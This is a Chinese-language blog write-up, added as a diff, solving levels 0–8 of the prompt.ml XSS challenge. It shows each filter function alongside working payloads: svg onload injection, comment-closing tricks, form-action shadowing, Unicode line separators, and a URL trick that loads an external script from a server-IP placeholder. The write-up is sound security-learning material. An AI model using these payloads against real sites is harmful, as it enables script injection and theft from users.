@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    
+    <title>prompt to win(1) writeup | CherryGk&#39;s Blog | If you have any questions, please contact QQ1196821466 or leave message in the upper right.</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="xss">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
+    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	false,
+            lv: JSON.parse('{"enable":true,"app_id":"BgxLbK8bfVBhr3OOhIdHmoKz-gzGzoHsz","app_key":"twfcGffxeJ6Bfm4fpJUQ256M","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"BgxLbK8bfVBhr3OOhIdHmoKz-gzGzoHsz","appkey":"twfcGffxeJ6Bfm4fpJUQ256M","notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":"c1ada43c"}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.3.2"></script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname"></h5>
+          <a href="mailto:1196821466@qq.com" title="1196821466@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>1</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>8</span>
+            
+              <span>2</span>
+            
+              <span>1</span>
+            
+              <span>4</span>
+            
+              <span>6</span>
+            
+              <span>6</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                文章分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                文章总览
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-plus-square"></i>
+                友链
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>prompt to win(1) writeup</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">prompt to win(1) writeup</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-12-23T05:39:50.000Z" itemprop="datePublished" class="page-time">
+  2018-12-23
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-prompt"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">prompt to win(1) writeup</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-12-23 13:39:50" datetime="2018-12-23T05:39:50.000Z"  itemprop="datePublished">2018-12-23</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>
+
+
+
+            
+	<span id="/2018/12/23/prompt/" class="leancloud_visitors" data-flag-title="prompt to win(1) writeup" title="prompt to win(1) writeup">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2018/12/23/prompt/#comment">
+            <span class="valine-comment-count" data-xid="/2018/12/23/prompt/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h2 id="prompt-ml-xss挑战平台"><a href="#prompt-ml-xss挑战平台" class="headerlink" title="prompt.ml xss挑战平台"></a>prompt.ml xss挑战平台</h2><p>规则是成功执行<code>prompt(1)</code>即可成功</p>
+<h3 id="0"><a href="#0" class="headerlink" title="0"></a>0</h3><p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // warm up</span><br><span class="line">    // script should be executed without user interaction</span><br><span class="line">    return &apos;&lt;input type=&quot;text&quot; value=&quot;&apos; + input + &apos;&quot;&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>没有任何过滤，闭合括号就行<br>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg/onload=prompt(1)&gt;</span><br></pre></td></tr></table></figure></p>
+<p>关于svg标签的问题，<a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">参考文章</a>,学习了新姿势</p>
+<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // tags stripping mechanism from ExtJS library</span><br><span class="line">    // Ext.util.Format.stripTags</span><br><span class="line">    var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;</span><br><span class="line">    input = input.replace(stripTagsRE, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">    return &apos;&lt;article&gt;&apos; + input + &apos;&lt;/article&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里过滤了 <code>&lt;&gt;</code>号里的内容<br>过滤方法就是用<code>//</code>注释，这样的话也是可以成功的<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=prompt(1)//</span><br></pre></td></tr></table></figure></p>
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    //                      v-- frowny face</span><br><span class="line">    input = input.replace(/[=(]/g, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">    // ok seriously, disallows equal signs and open parenthesis</span><br><span class="line">    return input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看出来这里是过滤了<code>(</code>,同样的，在<code>svg</code>标签里的<code>script</code>，<code>&amp;#40;</code>会被解析成<code>(</code>,<br>相同的道理还有:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x28;、&amp;lpar</span><br></pre></td></tr></table></figure></p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)&lt;/script&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p>
+<p>网上还有一种payload,调用的eval:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval.call`$&#123;&apos;prompt\x281)&apos;&#125;`&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // filter potential comment end delimiters</span><br><span class="line">    input = input.replace(/-&gt;/g, &apos;_&apos;);</span><br><span class="line"></span><br><span class="line">    // comment the input to avoid script execution</span><br><span class="line">    return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>当<code>-&gt;</code>连在一起的时候会被替换成<code>_</code>，需要做的是将前面的<code>&lt;!--</code>闭合，<br>绕过的方法很简单<code>--!&gt;</code>，这样也是可以闭合的<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>网上的另一种payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;svg/onload=prompt(1)</span><br></pre></td></tr></table></figure></p>
+<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // make sure the script belongs to own site</span><br><span class="line">    // sample script: http://prompt.ml/js/test.js</span><br><span class="line">    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) &#123;</span><br><span class="line">        var script = document.createElement(&apos;script&apos;);</span><br><span class="line">        script.src = input;</span><br><span class="line">        return script.outerHTML;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &apos;Invalid resource.&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里好像是涉及到了同源策略，<code>prompt.ml</code>才能访问，<br>这里绕过的是<code>URL黑魔法</code>，举个例子:<br>    <a href="http://cherry@qq.com" target="_blank" rel="noopener">http://cherry@qq.com</a><br>这句话的意思是用cherry这个用户名去登录qq.com，所以代码里的<code>if</code>就能绕过了<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://prompt.ml%2f服务器IP/hack.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // apply strict filter rules of level 0</span><br><span class="line">    // filter &quot;&gt;&quot; and event handlers</span><br><span class="line">    input = input.replace(/&gt;|on.+?=|focus/gi, &apos;_&apos;);</span><br><span class="line"></span><br><span class="line">    return &apos;&lt;input value=&quot;&apos; + input + &apos;&quot; type=&quot;text&quot;&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里是过滤了<code>&gt;</code>，然后<code>on</code>和<code>=</code>之间有字符的，<code>focus</code>替换成了<code>_</code>，<br>这里绕过的方式就是回车，比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert(&apos;</span><br><span class="line">cherry&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>这样也是可以执行的，并且这样可以绕过正则表达式；<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> &quot; src=1 type=image onerror</span><br><span class="line">=prompt(1) &quot;</span><br></pre></td></tr></table></figure></p>
+<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // let&apos;s do a post redirection</span><br><span class="line">    try &#123;</span><br><span class="line">        // pass in formURL#formDataJSON</span><br><span class="line">        // e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br><span class="line">        var segments = input.split(&apos;#&apos;);</span><br><span class="line">        var formURL = segments[0];</span><br><span class="line">        var formData = JSON.parse(segments[1]);</span><br><span class="line"></span><br><span class="line">        var form = document.createElement(&apos;form&apos;);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = &apos;post&apos;;</span><br><span class="line"></span><br><span class="line">        for (var i in formData) &#123;</span><br><span class="line">            var input = form.appendChild(document.createElement(&apos;input&apos;));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(&apos;value&apos;, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return form.outerHTML + &apos;                         \n\</span><br><span class="line">&lt;script&gt;                                                  \n\</span><br><span class="line">    // forbid javascript: or vbscript: and data: stuff    \n\</span><br><span class="line">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span><br><span class="line">        document.forms[0].submit();                       \n\</span><br><span class="line">    else                                                  \n\</span><br><span class="line">        document.write(&quot;Action forbidden.&quot;)               \n\</span><br><span class="line">&lt;/script&gt;                                                 \n\</span><br><span class="line">        &apos;;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        return &apos;Invalid form data.&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里代码较长，经过分析和测试，知道了是<br>    <a href="http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}" target="_blank" rel="noopener">http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}</a><br>这样的形式，<code>http://httpbin.org/post</code>是表单中的<code>action</code>,<code>name</code>和<code>Matt</code>分别是表单的<code>name</code>、<code>value</code><br>这里经常用的方法是直接用JavaScript的伪协议:<br>    javascript:prompt(1)<br>但是题目也做了防护，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (!/script:|data:/i.test(document.forms[0].action)) \n\</span><br><span class="line">        document.forms[0].submit();                       \n\</span><br><span class="line">    else                                                  \n\</span><br><span class="line">        document.write(&quot;Action forbidden.&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>如果直接用的话会出forbidden，这里绕过的方法利用了Javascirpt中表单DOM操作时，会先将<code>form</code>中的name属性作为action的输入框，<br>如果没有的话，再选择action属性进行输入。可以用下列代码实例，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=1&gt;&lt;/input&gt;&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    alert(document.forms[0].action);      </span><br><span class="line">&lt;/script&gt;  </span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这样的效果是:<br><figure class="image-box">
+                <a rel=prompt to win(1) writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15455355831.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15455355831.jpg" alt="" title="" class=""></a>
+                <p></p>
+            </figure></p>
+<p>再将代码换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;1&quot; value=1&gt;&lt;/input&gt;&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    alert(document.forms[0].action);      </span><br><span class="line">&lt;/script&gt;  </span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这样的效果是:</p>
+<figure class="image-box">
+                <a rel=prompt to win(1) writeup href="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15455357592.jpg" class="swipebox" title=undefined><img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15455357592.jpg" alt="" title="" class=""></a>
+                <p></p>
+            </figure>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // pass in something like dog#cat#bird#mouse...</span><br><span class="line">    var segments = input.split(&apos;#&apos;);</span><br><span class="line">    return segments.map(function(title) &#123;</span><br><span class="line">        // title can only contain 12 characters</span><br><span class="line">        return &apos;&lt;p class=&quot;comment&quot; title=&quot;&apos; + title.slice(0, 12) + &apos;&quot;&gt;&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;).join(&apos;\n&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这关限制是做的长度限制，并且用<code>#</code>分隔后，可以输入很多行，每行限制12个字符<br>绕过的方法就是用JavaScript的注释符，<code>/**/</code>,<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;/*#*/prompt/*#*/(1)/*#*/&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>网上的第二种用<code>&lt;svg&gt;</code>绕过的方法，原理类似<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg/a=#&quot;onload=&apos;/*#*/prompt(1)&apos;</span><br></pre></td></tr></table></figure></p>
+<h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // prevent input from getting out of comment</span><br><span class="line">    // strip off line-breaks and stuff</span><br><span class="line">    input = input.replace(/[\r\n&lt;/&quot;]/g, &apos;&apos;);</span><br><span class="line"></span><br><span class="line">    return &apos;                                \n\</span><br><span class="line">&lt;script&gt;                                    \n\</span><br><span class="line">    // console.log(&quot;&apos; + input + &apos;&quot;);        \n\</span><br><span class="line">&lt;/script&gt; &apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>先看过滤，换行干掉了，<code>&lt; &quot;</code>也干掉了,没啥思路，找了网上的wp后知道了用unicode绕过<br>    U+2028是行分隔符<br>    U+2029是段落分隔符<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;\u2028prompt(1)\u2028--&gt;&apos; </span><br><span class="line">(放入控制台执行之后将得到的输入)</span><br></pre></td></tr></table></figure></p>
+<h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // filter potential start-tags</span><br><span class="line">    input = input.replace(/&lt;([a-zA-Z])/g, &apos;&lt;_$1&apos;);</span><br><span class="line">    // use all-caps for heading</span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span><br><span class="line">    return &apos;&lt;h1&gt;&apos; + input + &apos;&lt;/h1&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>函数先将<code>&lt;*</code>格式的全都变成了<code>&lt;_*</code>，然后还将字母全部转为大写形式</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2018-12-23T05:41:26.229Z" itemprop="dateUpdated">2018-12-23 13:41:26</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2018/12/23/prompt/" target="_blank" rel="external">http://yoursite.com/2018/12/23/prompt/</a>
+        
+    </div>
+    <footer>
+        <a href="http://yoursite.com">
+            <img src="/img/avatar.jpg" alt="">
+            
+        </a>
+    </footer>
+</blockquote>
+
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/12/23/prompt/&title=《prompt to win(1) writeup》 — CherryGk's Blog&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/12/23/prompt/&title=《prompt to win(1) writeup》 — CherryGk's Blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/12/23/prompt/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《prompt to win(1) writeup》 — CherryGk's Blog&url=http://yoursite.com/2018/12/23/prompt/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/12/23/prompt/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2018/10/21/bof/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">pwn入坑之bof writeup</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#prompt-ml-xss挑战平台"><span class="post-toc-number">1.</span> <span class="post-toc-text">prompt.ml xss挑战平台</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">0</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">3</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">4</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">5</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#6"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">6</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#7"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">7</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#8"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">8</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#9"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">9</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+</div>
+
+        <footer class="footer">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                 &copy; 2017 - 2018
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    </main>
